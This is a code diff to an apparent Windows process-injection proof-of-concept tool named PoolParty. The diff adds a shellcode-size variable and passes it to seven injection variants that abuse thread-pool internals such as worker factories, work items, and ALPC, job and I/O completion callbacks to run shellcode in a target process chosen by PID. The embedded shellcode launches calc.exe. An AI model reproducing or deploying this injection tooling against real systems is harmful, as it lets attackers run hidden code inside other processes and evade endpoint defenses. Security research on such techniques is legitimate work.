@@ -21,6 +21,8 @@ unsigned char g_Shellcode[] =
 "\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
 "\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";
 
+SIZE_T g_szShellcodeSize = sizeof(g_Shellcode);
+
 void PrintUsage()
 {
 	std::cout << "usage: PoolParty.exe -V <VARIANT ID> -P <TARGET PID>" << std::endl << std::endl <<
@@ -81,19 +83,19 @@ std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid)
 	switch (VariantId)
 	{
 	case 1: 
-		return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, g_Shellcode);
+		return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 2:
-		return std::make_unique<RemoteWorkItemInsertion>(TargetPid, g_Shellcode);
+		return std::make_unique<RemoteWorkItemInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 3:
-		return std::make_unique<RemoteWaitCallbackInsertion>(TargetPid, g_Shellcode);
+		return std::make_unique<RemoteWaitCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 4:
-		return std::make_unique<RemoteIoCompletionCallbackInsertion>(TargetPid, g_Shellcode);
+		return std::make_unique<RemoteIoCompletionCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 5:
-		return std::make_unique<RemoteAlpcCallbackInsertion>(TargetPid, g_Shellcode);
+		return std::make_unique<RemoteAlpcCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 6:
-		return std::make_unique<RemoteJobCallbackInsertion>(TargetPid, g_Shellcode);
+		return std::make_unique<RemoteJobCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	case 7:
-		return std::make_unique<RemoteDirectCallbackInsertion>(TargetPid, g_Shellcode);
+		return std::make_unique<RemoteDirectCallbackInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
 	default:
 		throw std::runtime_error("Invalid variant ID");
 	}
